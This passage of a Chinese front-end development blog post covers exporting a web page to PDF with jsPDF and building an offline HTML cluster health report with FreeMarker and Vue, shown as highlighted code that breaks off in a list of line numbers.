      <span class="token keyword">const</span> imgHeight <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">592.28</span> <span class="token operator">/</span> contentWidth<span class="token punctuation">)</span> <span class="token operator">*</span> contentHeight<span class="token punctuation">;</span>
      pdf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JsPDF</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'pt'</span><span class="token punctuation">,</span> <span class="token string">'a4'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// const pdf = new JsPDF('p', 'pt', 'a4', true);</span>
      <span class="token keyword">const</span> leftPos <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>
      <span class="token keyword">const</span> topPos <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span>

      <span class="token comment">// 有两个高度需要区分，一个是html页面的实际高度，和生成pdf的页面高度(841.89)</span>
      <span class="token comment">// 当内容未超过pdf一页显示的范围，无需分页</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>leftHeight <span class="token operator">&lt;</span> pageHeight<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        pdf<span class="token punctuation">.</span><span class="token function">addImage</span><span class="token punctuation">(</span>pageData<span class="token punctuation">,</span> <span class="token string">'JPEG'</span><span class="token punctuation">,</span> leftPos<span class="token punctuation">,</span> topPos<span class="token punctuation">,</span> imgWidth<span class="token punctuation">,</span> imgHeight<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>leftHeight <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          pdf<span class="token punctuation">.</span><span class="token function">addImage</span><span class="token punctuation">(</span>pageData<span class="token punctuation">,</span> <span class="token string">'JPEG'</span><span class="token punctuation">,</span> leftPos<span class="token punctuation">,</span> position <span class="token operator">+</span> topPos<span class="token punctuation">,</span> imgWidth<span class="token punctuation">,</span> imgHeight<span class="token punctuation">)</span><span class="token punctuation">;</span>
          leftHeight <span class="token operator">-=</span> pageHeight<span class="token punctuation">;</span>
          position <span class="token operator">-=</span> <span class="token number">841.89</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>leftHeight <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            pdf<span class="token punctuation">.</span><span class="token function">addPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> pdfWidth <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>contentWidth <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0.75</span><span class="token punctuation">;</span>
      <span class="token keyword">const</span> pdfHeight <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>contentHeight <span class="token operator">+</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0.75</span><span class="token punctuation">;</span> <span class="token comment">// 500为底部留白</span>
      <span class="token keyword">const</span> imgWidth <span class="token operator">=</span> pdfWidth<span class="token punctuation">;</span>
      <span class="token keyword">const</span> imgHeight <span class="token operator">=</span> <span class="token punctuation">(</span>contentHeight <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0.75</span><span class="token punctuation">;</span> <span class="token comment">// 内容图片这里不需要留白的距离</span>
      pdf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JsPDF</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'pt'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>pdfWidth<span class="token punctuation">,</span> pdfHeight<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      pdf<span class="token punctuation">.</span><span class="token function">addImage</span><span class="token punctuation">(</span>pageData<span class="token punctuation">,</span> <span class="token string">'jpeg'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> imgWidth<span class="token punctuation">,</span> imgHeight<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> pdf<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>fileName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.pdf</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br></div></div><h4 id="导出可操作的离线html"><a href="#导出可操作的离线html" class="header-anchor">#</a> 导出可操作的离线html</h4> <p>Freemark(后端动态生成) + vue实现(渐进式语法及样式)；</p> <blockquote><p>参考自己github中代码实现；(<a href="https://github.com/yessz/ftl-vue-gulp" target="_blank" rel="noopener noreferrer">yessz/ftl-vue-gulp: ftl-vue-gulp (github.com)<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>)</p></blockquote> <p>Freemark生成后的信息；</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>en<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>en<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>ftp-vue<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Content-Type<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/html; charset=UTF-8<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://unpkg.com/jquery@3.5.1/dist/jquery.min.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://unpkg.com/vue@2.6.12/dist/vue.min.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://unpkg.com/vue-router@3.4.9/dist/vue-router.min.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://unpkg.com/axios@0.21.0/dist/axios.min.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://unpkg.com/ant-design-vue@1.7.2/dist/antd.min.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>stylesheet<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://unpkg.com/ant-design-vue@1.7.2/dist/antd.min.css<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>link</span><span class="token punctuation">&gt;</span></span>
    <span class="token comment">&lt;!-- &lt;link rel=&quot;stylesheet&quot; href=&quot;./global.css&quot;&gt;&lt;/link&gt; --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span> 
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">

        <span class="token selector">.flex</span> <span class="token punctuation">{</span>
            <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token selector">.flex-cc</span> <span class="token punctuation">{</span>
            <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>
            <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token selector">.full-page</span> <span class="token punctuation">{</span>
            <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
            <span class="token property">height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token selector">.mt0</span> <span class="token punctuation">{</span>
            <span class="token property">margin-top</span><span class="token punctuation">:</span> 0 <span class="token important">!important</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token selector">.mb0</span> <span class="token punctuation">{</span>
            <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 0 <span class="token important">!important</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token selector">.topInfo</span> <span class="token punctuation">{</span>
            <span class="token property">border-bottom</span><span class="token punctuation">:</span> 1px solid #eff1f4<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token selector">.descTitle</span> <span class="token punctuation">{</span>
            <span class="token property">padding-bottom</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>
            <span class="token property">font-size</span><span class="token punctuation">:</span> 12px<span class="token punctuation">;</span>
            <span class="token property">font-weight</span><span class="token punctuation">:</span> bold<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token selector">.descTitle:before</span> <span class="token punctuation">{</span>
            <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">;</span>
            <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>
            <span class="token property">width</span><span class="token punctuation">:</span> 2px<span class="token punctuation">;</span>
            <span class="token property">height</span><span class="token punctuation">:</span> 14px<span class="token punctuation">;</span>
            <span class="token property">margin-right</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>
            <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>
            <span class="token property">background-color</span><span class="token punctuation">:</span> #00c1de<span class="token punctuation">;</span>
            <span class="token property">top</span><span class="token punctuation">:</span> 2px<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>app<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>flex-ccc<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>{{report.reportName}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>flex-ccc topInfo<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>得分:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>{{ Number(report.scores).toFixed(2) }}分<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a-collapse</span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>activeKey<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a-collapse-panel</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>1<span class="token punctuation">&quot;</span></span> <span class="token attr-name">header</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>组件健康状态分析报告<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a-list</span> <span class="token attr-name">item-layout</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>horizontal<span class="token punctuation">&quot;</span></span> <span class="token attr-name">:data-source</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>componentReport<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a-list-item</span> <span class="token attr-name">slot</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>renderItem<span class="token punctuation">&quot;</span></span> <span class="token attr-name">slot-scope</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>item, index<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">:key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>item.componentName<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>descTitle<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>{{ item.componentName }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a-table</span>
                                <span class="token attr-name">:columns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>itemColumns<span class="token punctuation">&quot;</span></span>
                                <span class="token attr-name">:data-source</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>item.subComponentList<span class="token punctuation">&quot;</span></span>
                                <span class="token attr-name">:pagination</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>false<span class="token punctuation">&quot;</span></span>
                        <span class="token punctuation">&gt;</span></span>
                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">slot</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>name<span class="token punctuation">&quot;</span></span> <span class="token attr-name">slot-scope</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>{{ text }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a-table</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a-list-item</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a-list</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a-collapse-panel</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a-collapse</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">var</span> itemColumns <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token punctuation">{</span>
            title<span class="token operator">:</span> <span class="token string">&quot;子组件节点数量&quot;</span><span class="token punctuation">,</span>
            key<span class="token operator">:</span> <span class="token string">&quot;hostNum&quot;</span><span class="token punctuation">,</span>
            dataIndex<span class="token operator">:</span> <span class="token string">&quot;hostNum&quot;</span><span class="token punctuation">,</span>
            ellipsis<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
            width<span class="token operator">:</span> <span class="token string">&quot;10%&quot;</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> columns <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token punctuation">{</span>
            title<span class="token operator">:</span> <span class="token string">&quot;风险级别&quot;</span><span class="token punctuation">,</span>
            dataIndex<span class="token operator">:</span> <span class="token string">&quot;riskRank&quot;</span><span class="token punctuation">,</span>
            key<span class="token operator">:</span> <span class="token string">&quot;riskRank&quot;</span><span class="token punctuation">,</span>
            ellipsis<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
            width<span class="token operator">:</span> <span class="token number">80</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
        el<span class="token operator">:</span> <span class="token string">&quot;#app&quot;</span><span class="token punctuation">,</span>
        data<span class="token operator">:</span> <span class="token punctuation">{</span>
            itemColumns<span class="token punctuation">,</span>
            columns<span class="token punctuation">,</span>
            columnsTask<span class="token punctuation">,</span>
            activeKey<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">&quot;1&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;2&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;3&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;4&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            report<span class="token operator">:</span> Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'{&quot;beginTime&quot;:1607529600000,&quot;clusterId&quot;:26,&quot;endTime&quot;:1607529600000,&quot;reportInstId&quot;:2055,&quot;reportName&quot;:&quot;hdp生产集群&quot;,&quot;scores&quot;:90.625,&quot;staffId&quot;:&quot;autorun&quot;,&quot;updateDate&quot;:1607589666000}'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            repairAdvice<span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'&quot;请人工咨询&quot;'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">''</span><span class="token punctuation">,</span>
            exceptionSite<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">DataNode：主机host166异常;
</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token comment">//特殊字符不能用json处理；</span>
    <span class="token comment">//         exceptionSite: `DataNode：主机host166异常;</span>
    <span class="token comment">//         NodeManager：主机host166异常、主机host167异常;</span>
    <span class="token comment">// `,</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span 